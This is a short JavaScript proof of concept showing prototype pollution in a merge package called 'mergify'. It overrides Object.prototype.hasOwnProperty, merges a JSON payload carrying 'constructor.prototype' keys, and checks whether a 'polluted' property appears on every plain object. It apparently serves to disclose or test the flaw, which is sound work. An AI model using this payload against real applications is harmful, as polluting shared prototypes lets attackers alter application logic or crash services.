Object.prototype.hasOwnProperty = () => true;
const mergify = require('mergify');
const payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
console.log({}.polluted);
mergify({}, JSON.parse(payload));
console.log({}.polluted);